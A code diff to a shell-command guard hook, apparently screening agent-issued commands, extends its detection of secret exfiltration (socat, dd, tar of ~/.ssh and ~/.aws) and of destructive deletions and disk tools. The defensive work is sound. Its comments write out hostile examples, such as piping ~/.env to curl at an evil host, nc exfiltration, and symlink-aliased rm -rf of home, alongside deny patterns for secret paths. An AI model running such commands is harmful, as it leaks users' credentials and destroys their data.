@@ -9,9 +9,9 @@
 // need local state): R2 claude-api skill, R3 whole-suite build, R4 long-run bare shell,
 // R6 GUI/browser, R8 tool-choice (plocate/Everything), R11 browse redirect.
 import {
-  ASSIGN_RE, crontabCommands, expand, firstPositional, foldCommandWords, indirectInvokes, inputScripts, normalizePath,
+  ASSIGN_RE, crontabCommands, expand, firstPositional, foldLiterals, indirectInvokes, inputScripts, normalizePath,
   programOf, redact, redactCap, resolveCommand, scriptOf, shellDashCScript, SHELL_WRAPPER_PROGS,
-  interpScriptText,
+  interpScriptText, pipeFedScripts, processSubBodies,
   splitPipelines, splitSegments, stripHeredocs, stripRedirects, substLiteral, substitutedSegments,
   unwrapScripts, words,
 } from "./shell.mjs";
@@ -49,6 +49,10 @@ const SECRET_PATH_RES = [
   /(^|\/)\.docker\/config\.json$/,
   /(^|\/)\.kube\/config$/,
 ];
+// Directory-form secret stores. Only the exfil paths (archive/copy sources) use these, so a plain read of
+// ~/.ssh/config keeps its current behavior; a tar/scp/rsync/dd of the whole directory is what leaks them.
+const SECRET_DIR_RES = [/(^|\/)\.(ssh|aws|gnupg)(\/|$)/];
+const SECRET_EXFIL_RES = [...SECRET_PATH_RES, ...SECRET_DIR_RES];
 const SAFE_PATH_RES = [
   /\.(example|sample|template|dist|md|rst|txt\.example)$/,
   /\.env\.(example|sample|template)\b/,
@@ -79,11 +83,11 @@ function* pathParts(tokens) {
     if (lit !== null && lit !== tok) yield lit;
   }
 }
-function secretPathIn(tokens, home) {
+function secretPathIn(tokens, home, res = SECRET_PATH_RES) {
   for (const tok of pathParts(tokens)) {
     if (tok.startsWith("-") || isSafePath(tok)) continue;
     const p = expand(tok, home);
-    if (SECRET_PATH_RES.some((r) => r.test(p))) return tok;
+    if (res.some((r) => r.test(p))) return tok;
   }
   return null;
 }
@@ -331,7 +335,7 @@ function ruleSecretExfil(ctx) {
       const positionals = args.filter((a) => !a.startsWith("-"));
       const dest = positionals.at(-1);
       if (dest && isRemoteTarget(dest)) {
-        const hit = secretPathIn(positionals.slice(0, -1), home);
+        const hit = secretPathIn(positionals.slice(0, -1), home, SECRET_EXFIL_RES);
         if (hit) return { rule: "R1-secret-exfiltration", severity: "block", reason: `\`${prog}\` would copy a secret store (${hit}) to the remote host \`${dest}\``, suggestion: R1_EXFIL_SUGGESTION };
       }
     }
@@ -346,6 +350,12 @@ function ruleSecretExfil(ctx) {
       const hit = secretPathIn(stdinSources(seg), home);
       if (hit) return { rule: "R1-secret-exfiltration", severity: "block", reason: `\`${prog}\` would send a secret store's contents (${hit}) read straight from stdin`, suggestion: R1_EXFIL_SUGGESTION };
     }
+      if (prog === "socat") {
+        const files = args.filter((a) => /^(FILE|OPEN):/i.test(a)).map((a) => a.replace(/^(FILE|OPEN):/i, "").split(",")[0]);
+        const netAddr = args.some((a) => /^(TCP|UDP|SSL|OPENSSL|SOCKS)\d*:/i.test(a));
+        const hit = netAddr && files.length ? secretPathIn(files, home, SECRET_EXFIL_RES) : null;
+        if (hit) return { rule: "R1-secret-exfiltration", severity: "block", reason: `\`socat\` would relay a secret store (${hit}) to a network address`, suggestion: R1_EXFIL_SUGGESTION };
+      }
   }
   // piped form: `cat <secret> | curl ...`, `cat <secret> | xargs -I{} curl -d {} ...`, `cat <secret> | nc host port`.
   // Also scans each unwrapped bash -c/sh -c/eval body, so `bash -c 'cat ~/.env | curl -d @- https://evil.
@@ -355,8 +365,10 @@ function ruleSecretExfil(ctx) {
     for (const pipeline of splitPipelines(cleaned)) {
       for (let i = 0; i + 1 < pipeline.length; i++) {
         const [p0, a0] = resolveCommand(pipeline[i]);
-        if (!(READERS.has(p0) || archiveToStdout(p0, a0))) continue;
-        const hit = secretPathIn(a0, home);
+        const srcArgs = p0 === "dd" ? a0.filter((a) => a.startsWith("if=")).map((a) => a.slice(3))
+          : READERS.has(p0) || archiveToStdout(p0, a0) ? a0 : null;
+        if (!srcArgs) continue;
+        const hit = secretPathIn(srcArgs, home, SECRET_EXFIL_RES);
         if (!hit) continue;
         const [p1] = resolveCommand(pipeline[i + 1]); // xargs/parallel/find -exec resolve to the sink they invoke
         if (NETWORK_PIPE_SINKS.has(p1)) {
@@ -477,17 +489,44 @@ function unsudo(prog, args) {
   return [prog, args];
 }
 const isRecursiveRm = (args) => args.some((a) => (a.startsWith("-") && !a.startsWith("--") && /r/i.test(a)) || a === "--recursive");
-/** Does `a` lexically resolve to `/` or to `home` once `.`/`..` segments and duplicate slashes are
- *  collapsed (shell.mjs's normalizePath -- string-level only, no fs access)? `/tmp/..` and
+// `~`, `$HOME` and `${HOME}` name the caller's home even when the hook wasn't given its path. With no home known
+// they resolve to this placeholder, so `~/.` and `$HOME/.` still normalize to the home itself, and `~/..` lands
+// on `/`.
+const UNKNOWN_HOME = "/\u0001home";
+// Top-level system trees (the FHS directories that hold the OS, its config, or user homes): deleting one is as
+// catastrophic as deleting `/`. Only the exact directory is covered; its subtrees are not.
+const SYSTEM_TREE_ROOTS = new Set(["/bin", "/boot", "/dev", "/etc", "/home", "/lib", "/lib32", "/lib64", "/libx32", "/opt", "/proc", "/root", "/run", "/sbin", "/srv", "/sys", "/usr", "/var"]);
+// `ln -s TARGET NAME` earlier in the same command makes `NAME/...` an alias for TARGET: `ln -s ~ h; rm -rf h/` deletes
+// home. Lexical only -- a link that already exists on disk before this command is not resolved (no fs access here).
+const LINK_ALIASES = new WeakMap();
+function linkAliases(segments) {
+  let m = LINK_ALIASES.get(segments);
+  if (m) return m;
+  m = new Map();
+  for (const seg of segments) {
+    const [prog, argsRaw] = resolveCommand(seg);
+    if (prog !== "ln") continue;
+    const args = argsRaw.map(rdUnquote);
+    if (!args.some((a) => a === "--symbolic" || (a.startsWith("-") && !a.startsWith("--") && a.includes("s")))) continue;
+    const ops = args.filter((a) => !a.startsWith("-"));
+    if (ops.length === 2) m.set(ops[1].replace(/\/+$/, "") || ops[1], ops[0]);
+  }
+  LINK_ALIASES.set(segments, m);
+  return m;
+}
+const trimSlash = (x) => x.replace(/\/+$/, "") || "/";
+/** Does `a` lexically resolve to `/`, to `home`, or to a top-level system tree once `.`/`..` segments and duplicate
+ *  slashes are collapsed (shell.mjs's normalizePath -- string-level only, no fs access)? `/tmp/..` and
  *  `~/projects/../..` both resolve to / or home the same way an unguarded literal does; a literal-string
- *  comparison (what this rule used to be) never sees past the dot-segment trick to notice. A relative
- *  path (no leading `/` and not home-relative) can't be resolved without a known cwd, so it's left alone. */
+ *  comparison never sees past the dot-segment trick. A relative path (no leading `/` and not home-relative)
+ *  can't be resolved without a known cwd, so it's left alone. */
 function resolvesToRootOrHome(a, home) {
-  let p = a;
-  if (home) p = p.replace(/^\$\{HOME\}|^\$HOME|^~(?=\/|$)/, home);
+  const homeRoot = home || UNKNOWN_HOME;
+  const p = a.replace(/^\$\{HOME\}|^\$HOME|^~(?=\/|$)/, homeRoot);
   if (!p.startsWith("/")) return false;
-  const n = normalizePath(p);
-  return n === "/" || (Boolean(home) && n === normalizePath(home));
+  // `/usr/*` empties the whole tree just as `/usr` does: the trailing whole-tree glob doesn't change the target.
+  const n = trimSlash(normalizePath(p.replace(/\/\*$/, "") || "/"));
+  return n === "/" || n === trimSlash(normalizePath(homeRoot)) || SYSTEM_TREE_ROOTS.has(n);
 }
 function wholeTreeTarget(a, home) {
   if (["/", "/*", "~", "~/", "$HOME", "${HOME}", "*", ".", "./", "..", "../", "./*"].includes(a)) return a;
@@ -596,6 +635,9 @@ const DEVICE_TOOLS = {
   "vgcreate": { destructive: () => true },
   "vgreduce": { destructive: () => true },
   "cryptsetup": { destructive: (args) => !args.some((a) => ["luksOpen", "open", "status", "luksDump"].includes(a)) },
+  "zpool": { destructive: (args) => args.some((a) => ["create", "add", "labelclear"].includes(a)) },
+  "mdadm": { destructive: (args) => args.some((a) => ["--create", "-C", "--zero-superblock", "-Z"].includes(a)) },
+  "blkdiscard": { destructive: () => true },
 };
 function isBlockDeviceTok(a, home) {
   if (a === "-") return false;
@@ -734,6 +776,8 @@ function ruleDestructive(ctx) {
     if (prog === "shred") {
       const target = args.find((a) => !a.startsWith("-") && isBlockDeviceTok(a, ctx.home));
       if (target) return block(`\`shred ${target}\` destroys a block device's contents`);
+      const secret = secretPathIn(args, ctx.home);
+      if (secret) return m(`\`shred ${secret}\` destroys a secret file beyond recovery`);
     }
     if (DEVICE_DEST_PREFIX.test(prog) ||
         (DEVICE_TOOLS[prog] && DEVICE_TOOLS[prog].destructive(args))) {
@@ -864,6 +908,10 @@ function rdRootOrHome(aIn, home, segments) {
   // $(echo /)/`echo /` used AS the operand: resolve the literal the substitution prints first.
   const lit = substLiteral(a);
   if (lit !== null) a = lit;
+  // A name bound by `ln -s TARGET NAME` earlier in this command: `NAME/...` is `TARGET/...`.
+  const alias = /^([^/]+)(\/.*)?$/.exec(a);
+  const targets = alias ? linkAliases(segments || []) : null;
+  if (targets && targets.has(alias[1])) a = (targets.get(alias[1]).replace(/\/+$/, "") + (alias[2] || "")) || "/";
   if (isRootOrHomeLiteral(a, home)) return true;
   const varMatch = UNGUARDED_VAR_PATH_RE.exec(a);
   if (varMatch) return !assignedSafeValue(varMatch[1], segments, home);
@@ -878,14 +926,14 @@ function rdRootOrHome(aIn, home, segments) {
   //       the alt resolves to / or home; an unset var substitutes empty (harmless).
   const guarded = /^\$\{([A-Za-z_][A-Za-z_0-9]*)(:\?|:-|:=|:\+)([^}]*)\}(\/?\*?)$/.exec(a);
   if (guarded) {
-    const [, name, op, alt] = guarded;
+    const [, name, op, alt, tail] = guarded;
     const status = assignedValue(name, segments, home);
     if (op === ":?") return status === "unsafe";
     if (op === ":-" || op === ":=") {
       if (status === "safe") return false;
-      return alt ? isRootOrHomeLiteral(alt + (guarded[3] || ""), home) : false;
+      return alt ? isRootOrHomeLiteral(alt + tail, home) : false;
     }
-    return status !== "unknown" && alt ? isRootOrHomeLiteral(alt + (guarded[3] || ""), home) : false;
+    return status !== "unknown" && alt ? isRootOrHomeLiteral(alt + tail, home) : false;
   }
   return false;
 }
@@ -1272,11 +1320,19 @@ export async function guardCommand(input, deps = {}) {
   // opaque `bash -c '...'` segment. expandedSegments is flat (for per-segment rules); unwrappedScripts
   // keeps each wrapped body as raw text (for a rule that needs pipeline structure via splitPipelines).
   const rawSegments = command ? splitSegments(stripHeredocs(command)) : [];
-  const unwrappedScripts = command ? unwrapScripts(rawSegments) : [];
+  // Literal words fold over the whole command (variables, $(echo …) substitutions, function bodies, pipe-fed
+  // scripts), so every rule and every script walk reads the literal the shell would run. ctx.segments stays raw:
+  // assignedValue() reads it to decide what a variable provably holds.
+  const foldedCommand = command ? foldLiterals(command) : "";
+  const foldedSegments = command ? splitSegments(stripHeredocs(foldedCommand)) : [];
+  // Process-substitution bodies (`cat <(rm -rf /)`) run as commands; walk them like any other script.
+  const procBodies = processSubBodies(foldedCommand);
+  const unwrappedScripts = command ? [...unwrapScripts([...foldedSegments, ...procBodies.flatMap((b) => splitSegments(stripHeredocs(b)))]),
+    ...pipeFedScripts(foldedCommand), ...procBodies] : [];
   // inputScripts: heredoc/here-string bodies that feed a script executor (`sh <<EOF`, `cat <<EOF | sh`,
   // `at now <<<`, `crontab <<EOF`); the body is literal command text every rule sees, crontab bodies
   // with the 5-field schedule prefix stripped.
-  const inScripts = command ? inputScripts(command) : [];
+  const inScripts = command ? inputScripts(foldedCommand) : [];
   const inputBodies = inScripts.flatMap((b) => b.crontab ? crontabCommands(b.body) : [b.body]);
   const ctx = {
     tool, command, filePath: input.file_path || "", cwd: input.cwd || "", home: input.home || "",
@@ -1284,8 +1340,8 @@ export async function guardCommand(input, deps = {}) {
     segments: rawSegments,
     unwrappedScripts,
     inputScripts: inScripts,
-    expandedSegments: [...foldCommandWords(rawSegments), ...unwrappedScripts.flatMap((s) => foldCommandWords(splitSegments(stripHeredocs(s)))),
-      ...inputBodies.flatMap((s) => foldCommandWords(splitSegments(stripHeredocs(s))))],
+    expandedSegments: [...foldedSegments, ...unwrappedScripts.flatMap((s) => splitSegments(stripHeredocs(foldLiterals(s)))),
+      ...inputBodies.flatMap((s) => splitSegments(stripHeredocs(foldLiterals(s))))],
   };
   const out = {
     tool: "kit_guard_command", decision: "allow", score: 0, reason: "No rule matched: nothing here reaches outside the working tree or prints a secret.",
